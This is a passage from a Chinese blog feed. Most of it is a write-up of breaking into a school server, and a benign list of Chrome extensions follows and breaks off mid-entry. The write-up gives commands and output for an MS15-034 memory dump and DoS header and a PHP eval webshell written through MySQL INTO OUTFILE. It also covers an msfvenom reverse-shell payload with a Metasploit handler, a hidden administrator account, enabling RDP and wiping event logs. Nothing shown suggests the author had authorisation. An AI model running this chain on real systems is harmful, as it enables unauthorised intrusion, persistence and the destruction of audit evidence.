      <link href="2019/08/14/PenTest/"/>
      <url>2019/08/14/PenTest/</url>
      
        <content type="html"><![CDATA[<blockquote><p>发现学校其中一台服务器<del>可能</del>（<strong>绝对</strong>）存在漏洞。我想（<strong>绝对</strong>）能拿下它；</p><p>而且渗透测试的过程很有趣，便将其记录下来。</p></blockquote><span id="more"></span><h2 id="0x00-前期交互及信息收集"><a href="#0x00-前期交互及信息收集" class="headerlink" title="0x00 前期交互及信息收集"></a>0x00 前期交互及信息收集</h2><p>由于是对内网直接进行大扫描，所以直接判断这不仅是一个 Web 服务器（多个），同时还运行着 FTP、数据库。</p><p>在此，再次使用 nmap 扫描一次，结果如下：</p><pre><code class="zsh">$ sudo nmap -T4 -n -sS -sV -O 192.168.3.72Nmap scan report for 192.168.3.72Host is up (0.00076s latency).Not shown: 974 closed portsPORT      STATE    SERVICE        VERSION7/tcp     open     echo9/tcp     open     discard?13/tcp    open     daytime?17/tcp    open     qotd           Windows qotd (English)19/tcp    open     chargen21/tcp    open     ftp            FileZilla ftpd42/tcp    open     tcpwrapped80/tcp    open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)135/tcp   filtered msrpc139/tcp   filtered netbios-ssn445/tcp   filtered microsoft-ds999/tcp   open     http           Apache httpd 2.4.33 ((Win32) OpenSSL/1.0.2o mod_fcgid/2.3.9 mod_jk/1.2.40)1801/tcp  open     msmq?2107/tcp  open     msrpc          Microsoft Windows RPC2383/tcp  open     ms-olap4?3306/tcp  open     mysql          MySQL 5.5.193389/tcp  open     ms-wbt-server?8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)8080/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.18082/tcp  open     http           Microsoft IIS httpd 7.549152/tcp open     msrpc          Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port13-TCP:V=7.70%I=7%D=8/13%Time=5D53656C%P=x86_64-unknown-linux-gnu%rSF:(NULL,12,&quot;23:35:37\x202019/8/13\n&quot;)%r(NCP,12,&quot;23:35:37\x202019/8/13\n&quot;);Device type: general purposeRunning: Microsoft Windows Vista|2008|7OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_7OS details: Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7Network Distance: 2 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>乍一看，跑了这么多服务。初步判断很可能有 <strong>vulnerabilities</strong>。</p><p>总结，这是一台操作系统为 <strong>Windows</strong>（目前未能确认具体版本）的、运行着 FileZilla FTP、MySQL 5.5.19、Web等服务；而且开放了太多端口。</p><p>Web 服务器端口：<del>80</del>、999、<del>8080</del>、8082；运行着这么几个 Web 服务。</p><p>不过经确认，只有 <strong>999 Apache</strong> 和 <strong>8082 IIS</strong> 两个端口提供的 Web 服务正常。 </p><p>且，999 端口运行着 <strong>phpMyAdmin</strong>（一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库），当然也是漏洞多多。</p><h2 id="0x01-远程代码执行？？？"><a href="#0x01-远程代码执行？？？" class="headerlink" title="0x01 远程代码执行？？？"></a>0x01 远程代码执行？？？</h2><p>在<del>我一顿瞎几掰操作下</del>，其实是利用扫描器加手动验证；找到一个致命漏洞，该漏洞存在于端口 <strong>8082 IIS</strong> 服务器上。</p><h3 id="MS15-034-复现"><a href="#MS15-034-复现" class="headerlink" title="MS15-034 复现"></a>MS15-034 复现</h3><p><strong>HTTP.sys 远程执行代码漏洞 - CVE-2015-1635</strong></p><blockquote><p>当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p><p>若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。</p><p><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2015/ms15-034#vulnerability-in-httpsys-could-allow-remote-code-execution-3042553">详细</a></p></blockquote><p>根据微软安全公告，此漏洞貌似可以远程任意代码执行；但就实际复现来说，好像并不成立。</p><p>通过给 <strong>IIS</strong> 服务器发送如下 HTTP 请求，便可触发这个漏洞。</p><pre><code class="HTTP">GET / HTTP/1.1Host: stuffRange: bytes=0-18446744073709551615</code></pre><p>而我就直接使用的 <strong>wget</strong> 测试此漏洞，当然还可以使用 <strong>curl</strong> 和 <strong>MSF</strong>。</p><pre><code class="zsh">$ wget --header=&quot;Range: bytes=0-18446744073709551615&quot; http://192.168.3.72:8082/Images/top01.gif                                         --2019-08-13 23:44:03--  http://192.168.3.72:8082/Images/top01.gifConnecting to 192.168.3.72:8082... connected.HTTP request sent, awaiting response... 416 Requested Range Not Satisfiable    The file is already fully retrieved; nothing to do.</code></pre><p>如上请求包，若IIS服务器返回 “<strong>Requested Range Not Satisfiable</strong>“，则是存在漏洞，否则如果返回 “The request has an invalid header name”，则说明漏洞已经修补。</p><h3 id="进一步利用-危害"><a href="#进一步利用-危害" class="headerlink" title="进一步利用/危害"></a>进一步利用/危害</h3><p>前面的远程任意代码执行并不成立；此漏洞就当前利用来说，只能造成两种危害。</p><p>我使用 <strong>MSF</strong> 来 <strong>exploit</strong> 利用方式。</p><p>如下，使用 MSF 读取服务器内核内存数据。</p><pre><code class="msf">msf5 &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dumpmsf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set RHOSTS 192.168.3.72msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set RPORT 8082msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set TARGETURI /Images/top01.gifmsf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; exploit [+] Target may be vulnerable...[+] Stand by...[-] Memory dump start position not found, dumping all data instead[+] Memory contents:48 54 54 50 2f 31 2e 31 20 34 30 30 20 42 61 64    |HTTP/1.1 400 Bad|20 52 65 71 75 65 73 74 0d 0a 43 6f 6e 74 65 6e    | Request..Conten|74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d    |t-Type: text/htm|6c 3b 20 63 68 61 72 73 65 74 3d 75 73 2d 61 73    |l; charset=us-as|63 69 69 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |cii..Server: Mic|… … … … … … … … …72 6f 73 6f 66 74 2d 48 54 54 50 41 50 49 2f 32    |rosoft-HTTPAPI/2|45 72 72 6f 72 20 34 30 30 2e 20 54 68 65 20 72    |Error 400. The r|65 71 75 65 73 74 20 68 6f 73 74 6e 61 6d 65 20    |equest hostname |69 73 20 69 6e 76 61 6c 69 64 2e 3c 2f 70 3e 0d    |is invalid.&lt;/p&gt;.|0a 3c 2f 42 4f 44 59 3e 3c 2f 48 54 4d 4c 3e 0d    |.&lt;/BODY&gt;&lt;/HTML&gt;.|0a                                                 |.|[+] Memory dump saved to /home/f4n9x/.msf4/loot/20190814122223_default_192.168.3.72_iis.ms15034_317502.bin[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>第二种，我直接使用 wget 命令。</p><pre><code class="zsh">$ wget --header=&quot;Range: bytes=18-18446744073709551615&quot; http://192.168.3.72/Images/top01.gif</code></pre><p>在敲这条命令时，我双手一直是抖的🙃🙃。</p><p>这条命令回车下去直接对服务器造成 <strong>DoS</strong> 攻击，服务器必定<strong>假死</strong>或<strong>蓝屏</strong>；我就不回车了……</p><p>此漏洞利用，就到此为止咯。。。</p><h2 id="0x02-由-phpMyAdmin-入手"><a href="#0x02-由-phpMyAdmin-入手" class="headerlink" title="0x02 由 phpMyAdmin 入手"></a>0x02 由 phpMyAdmin 入手</h2><p>还不甘心，难道仅仅只能让此服务器蓝屏重启吗？？？</p><p>得想想办法拿到最高控制权！！！</p><p>再次整理思路……</p><p>phpMyAdmin URL 主页：192.168.3.72:999</p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>首先使用了 <strong>nikto</strong> 扫描了此站是否还有其他目录。</p><pre><code class="zsh">$ nikto -host http://192.168.3.72:999/ - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          192.168.3.72+ Target Hostname:    192.168.3.72+ Target Port:        999+ Start Time:         2019-08-13 23:55:43 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.33 (Win32) OpenSSL/1.0.2o mod_fcgid/2.3.9 mod_jk/1.2.40+ Retrieved x-powered-by header: PHP/5.3.29+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 0+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4e4e67f49da00 + Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ OSVDB-3092: /setup/: This might be interesting...+ OSVDB-3092: /README: README file found.+ OSVDB-3233: /icons/README: Apache default file found.+ 8348 requests: 0 error(s) and 17 item(s) reported on remote host+ End Time:           2019-08-13 23:56:50 (GMT8) (67 seconds)---------------------------------------------------------------------------+ 1 host(s) tested</code></pre><p>重点在 “<strong>+ OSVDB-3092: /setup/: This might be interesting…</strong>“，这一条。</p><p><strong>setup</strong> 没被关闭；由此判断管理员默认安装，这是很大的隐患。</p><p>如果管理员未对 phpmyadmin 目录下的 setup 文件进行安全处理，那普通用户可以在不进行身份认证的情况下，便可以配置服务器信息。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zebt3js5j30y40jy74y.jpg" <img src="/"></p><p>在这里呢！直接反手新建了一个服务器（MySQL服务器）。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zecvdrknj31170l240f.jpg" <img src="/"></p><p>而且在认证页面发现缓存的密码（huweishen.com），根据密码可以猜测 phpMyAdmin 安装方式应该是此护卫神网站上的某款软件傻瓜式安装滴！</p><p>回到主页，未出意外地登录进去了。</p><h3 id="CVE-2016-5734"><a href="#CVE-2016-5734" class="headerlink" title="CVE-2016-5734"></a>CVE-2016-5734</h3><p>中间还有一个小插曲。找到一个 phpMyAdmin 需身份验证的远程代码执行漏洞。</p><p><a href="https://www.exploit-db.com/exploits/40185">CVE-2016-5734_POC</a></p><pre><code class="zsh">$ ./cve-2016-5734.py -c &#39;system(ipconfig);&#39; -u root -p toor http://192.168.5.99:999/ERROR: #1286 - Unknown storage engine &#39;InnoDB&#39;</code></pre><p>但是很不幸，MySQL 中未开启 InnoDB 引擎。而开启方法只能是编辑系统中 MySQL 的配置文件 my.cnf。</p><pre><code class="mysql">MySQL [(none)]&gt; show variables like &quot;%innodb%&quot;;+-----------------------+----------+| Variable_name         | Value    |+-----------------------+----------+| have_innodb           | DISABLED || ignore_builtin_innodb | OFF      |+-----------------------+----------+2 rows in set (0.002 sec)</code></pre><p>CVE-2016-5734 利用失败。。。</p><h3 id="寻绝对路径，外写木马"><a href="#寻绝对路径，外写木马" class="headerlink" title="寻绝对路径，外写木马"></a>寻绝对路径，外写木马</h3><p>经测试发现，MySQL 中，<strong>into outfile</strong> 未被禁用，而且这里也不存在 WAF 拦截；root 用户拥有<strong>向外写文件</strong>的权限。</p><pre><code class="mysql">MySQL [(none)]&gt; SELECT @@global.secure_file_priv;+---------------------------+| @@global.secure_file_priv |+---------------------------+|                           |+---------------------------+1 row in set (0.001 sec)</code></pre><p>再查询未使用 <strong>secure-file-priv</strong> 参数；这说明不仅能向外写文件，而且想往哪里写就往哪儿写。</p><p>所以，只需找到 Web 物理路径；使用 SQL 语句向 Web 目录写个<strong>一句话木马</strong>，就能拿到服务器的 <strong>shell</strong>。</p><p>首先先判断当前 MySQL 的数据、插件等目录：</p><pre><code class="mysql">MySQL [(none)]&gt; show variables like &quot;%dir%&quot;;+-----------------------------------------+------------------------------------------+| Variable_name                           | Value                                    |+-----------------------------------------+------------------------------------------+| basedir                                 | D:/HwsApacheMaster/mysql/                || binlog_direct_non_transactional_updates | OFF                                      || character_sets_dir                      | D:\HwsApacheMaster\mysql\share\charsets\ || datadir                                 | D:\HwsApacheMaster\mysql\Data\           || lc_messages_dir                         | D:\HwsApacheMaster\mysql\share\          || plugin_dir                              | D:\HwsApacheMaster\mysql\lib/plugin      || slave_load_tmpdir                       | C:\Users\MYSQL_~1.005\AppData\Local\Temp || tmpdir                                  | C:\Users\MYSQL_~1.005\AppData\Local\Temp |+-----------------------------------------+------------------------------------------+8 rows in set (0.002 sec)</code></pre><p>发现 <strong>D:\</strong> 下一个有趣的目录 <strong>HwsApacheMaster</strong>，仅此而已。</p><p>此时把精力转向 Web 页面；打算在网页上瞎几掰乱试，指望 Web Application 程序出错，大力出奇迹般的报错将 Web 物理路径爆出来。绞尽脑汁地让程序报错；可惜，并没有。。。</p><p>思考许久……思路来了。</p><p>前面通过浏览器缓存发现的那个密码（<strong>huweishen.com</strong>）很有意思，通过这个密码可以发现，phpMyAdmin 是管理员<strong>默认安装</strong>的；灵光一现，直接去这个网站下载这个傻瓜式一键安装的软件（<strong>护卫神</strong>），<strong>安装至本地测试</strong>，不就知道了物理路径了嘛！！！</p><p>这款软件叫做【<strong>护卫神·Apache大师</strong>】；安装一整套环境至本地，发现目录结构如下：</p><pre><code class="zsh">├── D:/│   ├── HwsApacheMaster│   │   ├── phpmyadmin│   │   │   ├── web│   │   │   |    ├── libraries│   │   │   |    ├── database│   │   │   |    ├── doc│   │   │   |    ├── js│   │   │   |    ├── setup│   │   │   |    ├── themes│   │ ├── Apache2.2│   │ ├── Tomcat8│   │ ├── mysql│   │ ├── Java│   │ ├── php… … … … …</code></pre><p>此时很明确了，直接一句话木马写至某目录；还有注意转义符。</p><pre><code class="mysql">MySQL [(none)]&gt; select &quot;&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;&quot; into outfile &#39;D:\\HwsApacheMaster\\phpMyAdmin\\web\\she11.php&#39;;Query OK, 1 row affected (0.002 sec)</code></pre><p>然后，就可以使用<strong>菜刀</strong>等 shell 连接工具与木马进行连接；连接密码为 <strong>a</strong> 。</p><h2 id="0x03-后渗透测试"><a href="#0x03-后渗透测试" class="headerlink" title="0x03 后渗透测试"></a>0x03 后渗透测试</h2><h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>由于菜刀只能在Windows上使用，而我操作系统为 Linux，使用的是另一款 shell 连接工具 <strong><a href="https://github.com/AntSwordProject/antSword">AntSword(蚁剑)</a></strong> ， 开源、跨平台的网站（shell）管理工具。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zedmj0sfj30o80hb0t9.jpg" <img src="/"></p><p>连接上去后，进入终端，输入 <strong>cmd</strong> 命令会发现无法执行。</p><pre><code class="cmd">D:\HwsApacheMaster\phpmyadmin\web&gt; whoamiret=127</code></pre><p>这说明，php 配置文件 <strong>php.ini</strong> 中将一些危险函数给禁用掉了，即 <strong>disable_functions</strong>。将此项删除，清理一下缓存，便可以执行 cmd 了。</p><pre><code class="cmd">D:\HwsApacheMaster\phpmyadmin\web&gt; whoamint authority\system</code></pre><p>哇！<strong>system</strong> 权限。可是比 <strong>Administrator</strong> 管理员用户权限还要大，这也省的我之后的<strong>提权</strong>了。</p><h3 id="连接-Metasploit"><a href="#连接-Metasploit" class="headerlink" title="连接 Metasploit"></a>连接 Metasploit</h3><p>由于菜刀、蚁剑这类工具功能相比于 <strong>MSF</strong> 功能比较欠缺，所以我要再次生成一个木马用来<strong>反弹 shell</strong> 连接 <strong>MSF</strong>。</p><pre><code class="zsh">$ msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.23 LPORT=4444 -f exe -o she11.exe参数：    --platform  平台    -p             payload，有效载荷    LHOST        本地IP    LPORT        本地端口    -f            生成文件类型    -o            输出文件名</code></pre><p>将生成的木马通过蚁剑传至服务器上一个有执行权限的目录；虽然我和服务器并不在一个网段（本以为要做内网穿透的），但防火墙为<strong>关闭</strong>状态，依旧能够建立连接。</p><p>首先，MSF 先在本地侦听着4444端口，等着 shell 反弹回来。</p><pre><code class="msf">msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.5.23msf5 exploit(multi/handler) &gt; set LPORT 4444msf5 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.5.23:4444</code></pre><p>然后使用蚁剑，在 CMD 终端中执行刚刚生成的那个木马文件（she11.exe）</p><pre><code class="cmd">C:\Windows\System32&gt; C:/Windows/System32/she11.exe</code></pre><p>回车执行这个 <strong>exe</strong> 后，在 MSF 这边就会生成一个 <strong>meterpreter</strong>。</p><pre><code class="zsh">[*] Started reverse TCP handler on 192.168.5.23:4444 [*] Sending stage (206403 bytes) to 192.168.3.72[*] Meterpreter session 1 opened (192.168.5.23:4444 -&gt; 192.168.3.72:55580) at 2019-08-14 17:59:57 +0800meterpreter &gt; </code></pre><p><code>getuid</code> 获取当前用户，还是 <strong>SYSTEM</strong> 。</p><pre><code class="msf">meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><p>开启远程 <strong>RDP</strong> 连接</p><pre><code class="msf">meterpreter &gt; run post/windows/manage/enable_rdp[*] Enabling Remote Desktop[*]     RDP is already enabled[*] Setting Terminal Services service startup mode[*]     Terminal Services service is already set to auto[*]     Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: /home/f4n9x/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt</code></pre><p>查看刚刚开启 RDP 执行的具体命令。</p><pre><code class="zsh">$ cat /home/f4n9x/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt                execute -H -f cmd.exe -a &quot;/c &#39;netsh firewall set service type = remotedesktop mode = enable&#39;&quot;</code></pre><p>进入 <strong>CMD</strong> 模式。</p><pre><code class="msf">meterpreter &gt; shellProcess 7116 created.Channel 3 created.Microsoft Windows [版本 6.1.7600]版权所有 (c) 2009 Microsoft Corporation。保留所有权利。C:\Windows\System32&gt;</code></pre><p>查看当前所有用户。</p><pre><code class="cmd">C:\Windows\System32&gt;net user \\ 的用户帐户---------------------------------------------------------Administrator            Guest                    mysql           MySQL_HWS                www                      </code></pre><p>创建一个隐藏用户（Windows中在用户名后带上**$**即为隐藏用户，仅是简单隐藏），并拉入管理员用户组，查看。</p><pre><code class="cmd">C:\Windows\System32&gt;net user she11$ D@i123 /addC:\Windows\System32&gt;net localgroup administrators she11$ /addC:\Windows\System32&gt;net user she11$用户名                 she11$全名                   注释                   用户的注释             国家/地区代码          000 (系统默认值)帐户启用               Yes帐户到期               从不上次设置密码           2019/8/14 0:30:02密码到期               2019/9/25 0:30:02密码可更改             2019/8/14 0:30:02需要密码               Yes用户可以更改密码       Yes允许的工作站           All登录脚本               用户配置文件           主目录                 上次登录               2019/8/14 0:44:40可允许的登录小时数     All本地组成员             *Administrators       *Users               全局组成员             *None                 命令成功完成。</code></pre><p>完成后，直接登录到服务器。</p><pre><code class="zsh">$ rdesktop 192.168.3.72 -u she11$ -p D@i123 -g 1024x960</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zedz4a7bj31hc0u0gt5.jpg" <img src="/"></p><p>此过程中难免会留下日志信息痕迹，使用此命令来清理日志。</p><pre><code class="msf">meterpreter &gt; clearev [*] Wiping 16000 records from Application...[*] Wiping 20128 records from System...[*] Wiping 18688 records from Security...</code></pre><p>介于这台主机在一个单独的内网，后渗透的意义不大。所以就此完了。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PenTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些Chrome扩展推荐</title>
      <link href="2019/07/10/My-Chrome-Extensions/"/>
      <url>2019/07/10/My-Chrome-Extensions/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本人收集的一些不错的 Chrome 浏览器插件，目前也正在使用中。</p><p>由于精力有限，仅限 Google Chrome。</p></blockquote><h2 id="0x00-日常使用-Daily"><a href="#0x00-日常使用-Daily" class="headerlink" title="0x00 日常使用 | Daily"></a>0x00 日常使用 | Daily</h2><h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Proxy SwitchyOmega</a></h4><p>由于日常使用代理比较多（V2ray、Shadowsocksr、BurpSuite……），使用此插件来轻松快捷地管理和切换多个代理设置。</p><span id="more"></span><h4 id="Vimium"><a href="#Vimium" class="headerlink" title="Vimium"></a><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb">Vimium</a></h4><p>Vimium以Vim的精神提供键盘快捷键，用于导航和控制；由其命名，就应知道它与 Vim 的关系。确实能大大提高效率！！！</p><h4 id="Bookmark-Sidebar"><a href="#Bookmark-Sidebar" class="headerlink" title="Bookmark Sidebar"></a><a href="https://chrome.google.com/webstore/detail/bookmark-sidebar/jdbnofccmhefkmjbkkdkfiicjkgofkdh">Bookmark Sidebar</a></h4><p>目前正在使用的一个浏览器书签管理器，给人的感觉就是小巧精美。</p><h4 id="Chrome-Cleaner-Pro"><a href="#Chrome-Cleaner-Pro" class="headerlink" title="Chrome Cleaner Pro"></a>Chrome Cleaner Pro</h4><p>浏览器清理工具，加快 Chrome 响应速度。</p><h4 id="Extension-Manager"><a href="#Extension-Manager" class="headerlink" title="Extension Manager"></a>Extension Manager</h4><p>插件太多，使用这款工具来分类一键管理所有插件，提高效率。</p><h4 id="uBlock-Origin"><a href="#uBlock-Origin" class="headerlink" title="uBlock Origin"></a><a href="https://github.com/gorhill/uBlock/">uBlock Origin</a></h4><p>一款高效的请求过滤工具：占用极低的内存和CPU，和其他常见的过滤工具相比，它能够加载并执行上千条过滤规则。</p><h4 id="Remove-Google-Redirection"><a href="#Remove-Google-Redirection" class="headerlink" title="Remove Google Redirection"></a><a href="https://chrome.google.com/webstore/detail/remove-google-redirection/dnhjklgpiifbofihffldllbcopkinlod">Remove Google Redirection</a></h4><p>避免谷歌搜索结果链接重定向，加快网址打开速度；同时防止点击追踪。</p><h4 id="The-Great-Suspender"><a href="#The-Great-Suspender" class="headerlink" title="The Great Suspender"></a><a href="https://chrome.google.com/webstore/detail/the-great-suspender/klbibkeccnjlkjkiokjodocebajanakg">The Great Suspender</a></h4><p>冻结暂时用不到的标签页，以便释放系统资源。</p><h4 id="GayHub"><a href="#GayHub" class="headerlink" title="GayHub"></a><a href="https://github.com/jawil/GayHub">GayHub</a></h4><p>由名字就可以看出来，这是一款 GitHub 辅助插件。</p><p>功能有：</p><ul><li><p>文件目录树</p></li><li><p>TOC导航</p><p><img src="/" class="lazyload" data-src="https://camo.githubusercontent.com/b02a39be64778d8f20cd2db44b82c7358967d60f/687474703a2f2f6f70656f6b6634756b2e626b742e636c6f7564646e2e636f6d2f303036744e633739677931666a63386963376733666a33307a64306b7a6b38642e6a7067"  alt="TOC"></p></li><li><p>夜间暗色主题</p></li><li><p>图片全屏预览</p></li><li><p>复制代码</p><p><img src="/" class="lazyload" data-src="https://camo.githubusercontent.com/bab2a8243336f7dcbbc5e904aedb3bb25891188a/687474703a2f2f6f767963796a3970722e626b742e636c6f7564646e2e636f6d2f515132303137303930382d3136343434392e706e67"  alt="CopyCode"></p></li><li><p>图像展示</p></li><li><p>…………</p></li></ul><h4 id="Octotree"><a href="#Octotree" class="headerlink" title="Octotree"></a><a href="https://github.com/ovity/octotree">Octotree</a></h4><p>又一款 GitHub 插件；个人感觉这个比上一个要好用。</p><p><strong>Features：</strong></p><ul><li>易于导航的代码树，就像在IDE中一样</li><li>使用pjax快速浏览</li><li>支持私有存储库</li></ul><h4 id="Remu"><a href="#Remu" class="headerlink" title="Remu"></a><a href="https://github.com/zenghongtu/Remu">Remu</a></h4><p>一直以来，我对于 GitHub 上 Stars 的所有仓库都难以恭候。原因在于 Stars 数量实在是太多、找起来太麻烦了。</p><p>直到这款插件的出现……</p><p>Remu 通过标签分类来对GitHub Stars进行高效管理，借助Gists强大能力实现跨平台的数据同步。</p><p> class="lazyload" data-src="https://raw.githubusercontent.com/zenghongtu/Remu/master/docs/screenshot.png" <img src="/"></p><p><strong>Feature：</strong></p><ul><li>显示 star 仓库 / watching 仓库 (默认关闭)</li><li>添加 Notes</li><li>仓库设置/编辑/删除标签</li><li>取消 Star / Download Zip / Clone with HTTPS</li><li>Google 账号同步 Token/GistId, Gist 自动同步标签数据</li><li>…………</li></ul><h4 id="The-Fucking-Github"><a href="#The-Fucking-Github" class="headerlink" title="The Fucking Github"></a><a href="https://github.com/lvxianchao/the-fucking-github">The Fucking Github</a></h4><p>这款工具和上面那个插件一样，用来很方便地查看、整理、搜索你已经 Star 过的项目和搜索 Github 上的项目。</p><p>在布局上，个人感觉比 Remu 要好看。</p><p> class="lazyload" data-src="https://user-images.githubusercontent.com/22412818/56089456-8980d200-5ec5-11e9-9e6e-820677beefb8.png" <img src="/"></p><h2 id="0x01-文章写作-Writeups"><a href="#0x01-文章写作-Writeups" class="headerlink" title="0x01 文章写作 | Writeups"></a>0x01 文章写作 | Writeups</h2><h4 id="新浪微博图床"><a href="#新浪微博图床" class="headerlink" title="新浪微博图床"></a><a href="https://github.com/suxiaogang/WeiboPicBed">新浪微博图床</a></h4><p>本博客大部分图片都是用的 <strong>新浪微博图床</strong>，正是使用的这款插件上传至新浪博客图床。</p><p><img src="/" class="lazyload" data-src="https://camo.githubusercontent.com/c9128303f7e52d640b64b1cdd2a7948c924b3bcf/687474703a2f2f7777332e73696e61696d672e636e2f6c617267652f35666433373831386a77316577313732717378626f6732306c7a30633271636e2e676966"  alt="sineWeibo"></p><h4 id="UploadCC"><a href="#UploadCC" class="headerlink" title="UploadCC"></a>UploadCC</h4><p>一款简单的浏览器截屏插件。</p><h4 id="Nimbus"><a href="#Nimbus" class="headerlink" title="Nimbus"></a><a href="https://chrome.google.com/webstore/detail/nimbus-screenshot-screen/bpconcjcammlapcogcnnelfmaeghhagj">Nimbus</a></h4><p>全屏幕捕获网页或任何部分；编辑的截图；录制截屏视频、修改屏幕截图、分享截图和截屏视频。</p><p><strong>Notice：</strong><a href="https://everhelper.desk.com/customer/portal/articles/1180411-nimbus-screenshot---quick-guide">Nimbus ScreenShot - Quick Guide</a></p><h4 id="Fatkun-Batch-Download-Image"><a href="#Fatkun-Batch-Download-Image" class="headerlink" title="Fatkun Batch Download Image"></a>Fatkun Batch Download Image</h4><p>一款图片批量下载的插件，去试试这个站点 <a href="https://octodex.github.com/">Octodex_octocat</a>。</p><h4 id="Emoji-Keyboard"><a href="#Emoji-Keyboard" class="headerlink" title="Emoji Keyboard"></a><a href="https://chrome.google.com/webstore/detail/emoji-keyboard-emojis-for/fbcgkphadgmbalmlklhbdagcicajenei">Emoji Keyboard</a></h4><p>这个扩展可让您在计算机上输入表情符号，我的一些博文中的表情包就是来自这里儿。</p><p>😜😏😎🤨🧐🤤😒</p><h2 id="0x02-渗透测试-PenTest"><a href="#0x02-渗透测试-PenTest" class="headerlink" title="0x02 渗透测试 | PenTest"></a>0x02 渗透测试 | PenTest</h2><blockquote><p>这一部分算重点！！！</p></blockquote><h3 id="1）信息收集"><a href="#1）信息收集" class="headerlink" title="1）信息收集"></a>1）信息收集</h3><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a><a href="https://github.com/AliasIO/Wappalyzer">Wappalyzer</a></h4><p>识别网站所用技术栈，CMS、电商平台、开发语言、Web 框架、JS 框架、服务器软件、分析工具等等。</p><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap">Shodan</a></h4><p>邪恶的 <strong>Shodan</strong> 官方推出的插件，会自动检查Shodan是否有当前网站的任何信息。该网站是否还运行FTP，DNS，SSH或一些不寻常的服务？使用此插件，您可以查看Shodan在给定网站/域上收集的所有信息。</p><h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa">IP Address and Domain Information</a></h4><p>强大的一款网络层面信息收集的插件；支持显示当前网站以下</p><ul><li>IPv4/6 地址信息</li><li>ISP 信息</li><li>Domain</li><li>自身 IP</li><li>等等</li></ul><p>的一些网络、主机、开放 TCP\UDP 端口、服务软件、Whois、Geo、国家、DNS 等详细信息。</p><h4 id="EXIF-Viewer"><a href="#EXIF-Viewer" class="headerlink" title="EXIF Viewer"></a><a href="https://chrome.google.com/webstore/detail/exif-viewer/mmbhfeiddhndihdjeganjggkmjapkffm">EXIF Viewer</a></h4><p>查看网站中图像的 EXIF 数据，如果它有。</p><h4 id="Vulners-Web-Scanner"><a href="#Vulners-Web-Scanner" class="headerlink" title="Vulners Web Scanner"></a>Vulners Web Scanner</h4><p>基于 vulners.com 